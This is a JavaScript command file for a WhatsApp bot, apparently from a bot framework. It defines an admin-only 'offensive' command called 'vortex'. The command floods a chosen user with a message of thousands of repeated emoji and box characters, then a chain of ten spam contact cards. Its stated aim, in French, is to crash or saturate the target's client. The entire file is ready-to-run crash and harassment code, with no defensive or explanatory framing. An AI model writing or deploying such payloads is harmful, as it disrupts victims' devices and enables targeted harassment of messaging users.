const { log } = require('../utils/logger');

module.exports = {
    name: 'vortex',
    description: '🌀 Multi-Vector Crash: Sends an extreme lag payload of Unicode, Emoji, and VCard spam.',
    category: 'offensive',
    isAdmin: true,
    isOwner: true,
    async execute({ sock, chatId, message, args, bot }) {
        try {
            const target = message.message?.extendedTextMessage?.contextInfo?.participant ||
                (args[0] ? args[0].replace('@', '') + '@s.whatsapp.net' : chatId);

            await sock.sendMessage(chatId, { text: `🌀 *INITIATION DU VORTEX* sur @${target.split('@')[0]}...`, mentions: [target] });

            // 1. Unicode/Emoji Hybrid Lag
            const lagPayload = `🌀 *VORTEX_HYPER_LAG* 🌀\n` + "✨".repeat(2000) + "░".repeat(2000) + "📸".repeat(2000);

            // 2. VCard Chain
            const vCard = 'BEGIN:VCARD\n' +
                'VERSION:3.0\n' +
                'FN:🌀 ABYSSFLOW_VORTEX\n' +
                'TEL;type=CELL;type=VOICE;waid=00000000000:00000000000\n' +
                'END:VCARD';

            const contacts = Array(10).fill({ vcard: vCard });

            // Send vectors in burst
            await sock.sendMessage(target, { text: lagPayload });
            await sock.sendMessage(target, {
                contacts: {
                    displayName: "🌀 VORTEX_INFRASTRUCTURE",
                    contacts: contacts
                }
            });

            if (target !== chatId) {
                await sock.sendMessage(chatId, { text: `✅ *VORTEX DÉPLOYÉ.* La cible devrait subir une saturation critique.`, mentions: [target] });
            }

        } catch (error) {
            log.error('Error in VORTEX command:', error);
        }
    }
};
